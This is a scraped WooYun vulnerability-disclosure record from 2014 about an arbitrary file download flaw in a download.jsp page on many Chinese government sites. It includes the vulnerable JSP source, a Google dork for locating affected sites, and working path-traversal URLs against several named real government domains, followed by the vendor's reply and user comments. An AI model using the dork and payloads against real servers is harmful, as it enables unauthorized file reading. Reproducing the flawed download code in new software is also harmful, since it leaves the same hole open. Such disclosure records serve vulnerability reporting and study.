{"id": 4162, "wybug_id": "wooyun-2014-051383", "wybug_title": "某通用型政府系统任意文件下载", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "magerx", "wybug_date": "2014-02-19 11:36", "wybug_open_date": "2014-05-20 11:37", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向公众公开  简要描述： 任意文件下载0.0 详细说明：  1.漏洞出现在download.jsp中源码分析一下：\n<%@page language=\"java\" contentType=\"application/x-msdownload\" import=\"java.io.*,java.net.*\" pageEncoding=\"gb2312\"%><% String temp=request.getParameter(\"path\");if(temp.indexOf(\"UserFiles\")==-1){ //此处仅判断url中是否存在UserFiles关键字\tout.println(\"非法下载路径！\");    return;}String path=temp;//new String(temp.getBytes(\"8859_1\"),\"gb2312\"); //temp路径未做处理直接赋值给path，并用于下面的文件读取response.reset();response.setContentType(\"application/x-download\");String filenamedownload = path;String filenamedisplay = path.substring(path.lastIndexOf(\"/\")+1,path.length());filenamedisplay = URLEncoder.encode(filenamedisplay,\"UTF-8\"); response.addHeader(\"Content-Disposition\",\"attachment;filename=\" + filenamedisplay); OutputStream output = null; FileInputStream fis = null; try     {         output  = response.getOutputStream();         filenamedownload=request.getSession().getServletContext().getRealPath(\"/\")+filenamedownload;        System.out.println(\"filenamedownload:\"+filenamedownload);        File file=new File(filenamedownload);        if (!file.exists()){          out.println(\"对不起，文件已删除\");          return;        }        fis = new FileInputStream(filenamedownload);//所以问题就出现了                byte[] b = new byte[1024];         int i = 0;         while((i = fis.read(b)) > 0)         { output.write(b, 0, i);         }         output.flush();     }     ………………%>\n有的版本是这个样子：\nif(st != null && st.length > 0){        \tif(!\"UserFiles\".equals(st[0])){        \t\tout.println(\"文件不存在\");          \t\treturn;        \t}        }if(temp==null)\ttemp=\"\";String path=new String(temp.getBytes(\"8859_1\"),\"gb2312\");response.reset();String filenamedownload = path;String filenamedisplay = path.substring(path.lastIndexOf(\"/\")+1,path.length());//\"系统解决方案.doc\";//系统解决方案.txt filenamedisplay = URLEncoder.encode(filenamedisplay,\"UTF-8\"); response.addHeader(\"Content-Disposition\",\"attachment;filename=\" + filenamedisplay); OutputStream output = null; FileInputStream fis = null;\n其实基本一样了...2.google dork:来看看是否通用\nsite:gov.cn inurl:download.jsp?path=/UserFiles/\n获得约 2,590 条结果\n\n3.以其中一个站点测试：\njjcx.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jsp\n\n\n\n\n4.提供站点方便验证以及体现其通用性：\njjcx.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jspwww.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspcrj.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jspqz.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspwww.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspfz.fjhi.gov.cn/site/fuzhou/bin//download.jsp?path=UserFiles/../download.jspxxgk.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jsp\n   漏洞证明：  \n\n\n\n\n\n\njjcx.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jspwww.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspcrj.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jspqz.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspwww.fjhi.gov.cn/site/quanzhou/bin//download.jsp?path=UserFiles/../download.jspfz.fjhi.gov.cn/site/fuzhou/bin//download.jsp?path=UserFiles/../download.jspxxgk.fjgat.gov.cn/download.jsp?path=UserFiles/../download.jsp\n   修复方案：  麻烦通知修复吧   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-02-24 09:18 厂商回复： 对于所述下载功能页面引起的文件包含，是较为常见的，根据后续实例抽测，暂不能认定2590条结果是否为同一CMS或同一开发方（部分功能代码同源情况也比较多）。已经将涉及的福建省网站案例，转由CNCERT下发给福建分中心处置(此前已经有白帽子报送过两至三例)。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-19 11:55 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  上源码    \n     2014-02-19 12:06 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  高工上源码    \n     2014-02-19 12:30 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @saline 呃？哈哈    \n     2014-02-19 13:24 |    \t\tcmd2k \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 学习,努力,加油)\t\t \n  mark    \n     2014-03-16 14:15 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  无法确定是否通用啊？    \n     2014-05-20 16:50 |    \t\tMr.L \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:2        | 前端工程师)\t\t \n  天下一大抄呗    \n     2014-05-20 20:06 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  就下载一下 就给钱了？    \n     2014-05-20 20:12 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  呵呵~这个算通用？很多cmd都存在这个path=UserFiles的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}